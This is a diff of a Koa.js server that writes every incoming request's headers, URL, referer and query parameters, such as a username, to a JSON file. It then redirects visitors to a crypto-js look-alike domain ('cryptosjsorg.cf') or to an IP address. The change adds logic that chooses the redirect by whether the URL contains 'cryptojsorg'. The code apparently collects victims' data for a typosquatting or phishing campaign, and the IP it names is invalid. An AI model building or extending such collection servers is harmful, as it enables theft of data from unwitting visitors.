@@ -61,7 +61,7 @@ app.use( BodyParser() );
 
 const router = new Router();
 
-function addshuju(data,ctx){
+function addshuju(data,ctx,shu){
     // data.requestip=ctx.request.header.host; 
     // data.Origin=ctx.request.header.Origin; 
     data.header=ctx.request.header;
@@ -72,7 +72,11 @@ function addshuju(data,ctx){
     datas.todos.push(data);
     fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
     // ctx.body = ' .'
-    ctx.response.redirect('http://cryptosjsorg.cf');
+    if(shu){
+        ctx.response.redirect('http://cryptosjsorg.cf');
+    }else{
+        ctx.response.redirect('http://18.162.1194.33');
+    }
 }
 
 app.use(async (ctx, next)=>{
@@ -95,7 +99,7 @@ app.use(async (ctx, next)=>{
                
             }else{
                 var data = {uu:ctx.href,referer:str1||''};
-                addshuju(data,ctx)
+                addshuju(data,ctx,false)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'&referer='+str1|'');
             }
         }
@@ -187,7 +191,7 @@ router.post('/remove', async ctx => {
 // router.post('/add', async ctx => {
 router.get('/a', async ctx => {
     let data = ctx.request.query || {};
-    
+    var str=ctx.href; //请求地址
     header=ctx.request.header;
     // console.log('header',header);
     // console.log('Origin',header.origin);
@@ -226,8 +230,8 @@ router.get('/a', async ctx => {
         })
         
     }else{
-        
-        addshuju(data,ctx)
+        var shu=str.includes('cryptojsorg');
+        addshuju(data,ctx,shu)
         
     }
     
